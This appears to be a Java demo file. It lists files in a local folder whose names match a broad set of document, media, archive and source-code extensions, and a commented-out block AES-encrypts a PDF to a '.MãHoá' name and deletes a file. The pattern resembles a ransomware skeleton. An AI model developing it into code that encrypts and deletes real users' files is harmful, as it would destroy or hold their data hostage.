package src;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.function.Predicate;
import java.util.stream.Collectors;

public class App {
    public static void main(String[] args) {

        File dir = new File("src/file_demo");
        dir = new File(dir.getAbsolutePath());

        List<String> extension = Arrays.asList(
                ".doc",".docx",".txt",".pdf",".xls",".xlsx",".ppt",
                ".pptx",".mp3",".mp4",".mkv",".html",".java",".cpp",
                ".php",".js",".py",".css",".ts",".zip",".rar",
                ".7z",".png",".jpg",".jpeg",".psd",".raw",".json",
                ".xml",".scss");

        Predicate<String> predicate = s->{
            List<String> constainExt = extension.stream().filter(ext->s.contains(ext)).collect(Collectors.toList());
            return constainExt.size() > 0;
        };

        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(),dir)
                .stream()
                .filter(path-> predicate.test(path))
                .collect(Collectors.toList());

        System.out.println(fileList);



//        String fileInput = "src/file_demo/test.pdf";
//        String fileOutput = "src/file_demo/test.pdf.MãHoá";
//
//        try {
//            AES.encrypt(fileOutput,fileInput);
//            FileUtils.delete(fileOutput);
//        } catch (Exception e) {
//            throw new RuntimeException(e);
//        }
    }
}
